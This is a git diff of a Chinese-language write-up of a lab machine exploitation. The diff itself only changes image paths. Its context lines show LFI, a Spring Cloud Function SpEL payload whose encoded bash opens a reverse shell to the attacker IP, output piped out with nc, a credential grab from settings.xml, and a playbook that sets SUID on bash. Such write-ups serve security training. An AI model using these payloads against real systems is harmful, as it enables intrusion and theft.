@@ -6,23 +6,23 @@ typora-root-url: ./image
 
 Ip地址：
 
-![image-20230603203105184](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603203105184.png)
+![image-20230603203105184](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603203105184.png)
 
 直接访问IP地址拒绝访问，可能是80端口没开。
 
 kali nmap扫一下：
 
-![image-20230603203746134](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603203746134.png)
+![image-20230603203746134](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603203746134.png)
 
 发现开了22端口和8080端口。
 
 访问8080端口：
 
-![image-20230603203624481](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603203624481.png)
+![image-20230603203624481](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603203624481.png)
 
 扫了一圈都是静态页面，不过右上角有个upload，可以上传文件。
 
-![image-20230603203712469](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603203712469.png)
+![image-20230603203712469](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603203712469.png)
 
 除了图片其他文件都过滤了，不能上传webshell或者.htaccess。但是上传图片后图片名作为Get参数传入后端，就比较有意思了。
 
@@ -32,29 +32,29 @@ http://10.10.11.204:8080/show_image?img=shell.png
 
 BP抓包，看一下有没有文件包含（LFI）。
 
-![image-20230603204308169](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603204308169.png)
+![image-20230603204308169](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603204308169.png)
 
 果不其然，翻一下有没有敏感信息。
 
 除了root还有两个用户。
 
-![image-20230603204423359](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603204423359.png)
+![image-20230603204423359](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603204423359.png)
 
 再翻一翻，目录下文件不多的话能看就全看完吧，信息收集真的很重要。
 
 这里有一个pom.xml
 
-![image-20230603204712669](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603204712669.png)
+![image-20230603204712669](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603204712669.png)
 
 解释一下pom.xml是干嘛的：
 
 主要包含了项目的基本信息，可以看到用了项目中都用了哪些组件。
 
-![image-20230603205202807](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603205202807.png)
+![image-20230603205202807](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603205202807.png)
 
 看上去是web app使用了spring的框架。可以通过查找谷歌来找到可用的漏洞。
 
-![image-20230603210020247](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603210020247.png)
+![image-20230603210020247](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603210020247.png)
 
 国内也有一篇讲的不错的：https://www.cnblogs.com/9eek/p/16113603.html
 
@@ -66,7 +66,7 @@ BP抓包，看一下有没有文件包含（LFI）。
 
 本机瑞士军刀监听9999端口：
 
-![image-20230603210523013](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603210523013.png)
+![image-20230603210523013](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603210523013.png)
 
 构造Payload：
 
@@ -74,7 +74,7 @@ BP抓包，看一下有没有文件包含（LFI）。
 
 https://bewhale.github.io/tools/encode.html
 
-![image-20230603211406984](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603211406984.png)
+![image-20230603211406984](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603211406984.png)
 
 ```java
 T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE2LjUvOTk5OSAwPiYxJw==}|{base64,-d}|{bash,-i}")
@@ -82,11 +82,11 @@ T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+Ji
 
 写入**spring.cloud.function.routing-expression**字段，发包即可反弹shell。
 
-![image-20230603210921634](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603210921634.png)
+![image-20230603210921634](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603210921634.png)
 
 本地收到了反弹过来的shell:
 
-![image-20230603211525530](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603211525530.png)
+![image-20230603211525530](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603211525530.png)
 
 反弹过来的shell太难用而且还没法自动补全，通过python升级一下shell。
 
@@ -121,15 +121,15 @@ stty raw -echo;fg
 #键入reset
 ```
 
-![image-20230603211809743](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603211809743.png)
+![image-20230603211809743](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603211809743.png)
 
 查找输入frank的文件：
 
-![image-20230603212220456](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603212220456.png)
+![image-20230603212220456](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603212220456.png)
 
 通过`cat /home/frank/.m2/settings.xml`找到用户phil的密码。
 
-![image-20230603212332261](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603212332261.png)
+![image-20230603212332261](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603212332261.png)
 
 su切换用户到Phil，拿到第一个flag。
 
@@ -146,7 +146,7 @@ python3 -m http.server
 wget 10.10.16.5:8000/linpeas.sh
 ```
 
-![image-20230603212911397](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603212911397.png)
+![image-20230603212911397](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603212911397.png)
 
 运行linpeas.sh 并将结果传到本地：
 
@@ -162,11 +162,11 @@ sh linpeas.sh | nc 10.10.16.5 8888
 
 本地使用`less -r result.txt`带颜色阅读结果（也可以在靶机shell上直接用这个命令看，但是太卡）。
 
-![image-20230603214402650](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603214402650.png)
+![image-20230603214402650](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603214402650.png)
 
 在insteresting中发现playbook，并且是root权限。
 
-![image-20230603213322666](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603213322666.png)
+![image-20230603213322666](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603213322666.png)
 
 写xml通过python服务器和wget传到靶机。
 
@@ -182,12 +182,12 @@ chomd u+s /bin/bash
 
 下载完成
 
-![image-20230603214601584](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603214601584.png)
+![image-20230603214601584](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603214601584.png)
 
 等待自动运行即可
 
-![image-20230603214656609](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603214656609.png)
+![image-20230603214656609](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603214656609.png)
 
-![image-20230603214718220](/:Users:fanhexuan:Library:Application Support:typora-user-images:image-20230603214718220.png)
+![image-20230603214718220](image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230603214718220.png)
 
 提权成功，拿到system flag。
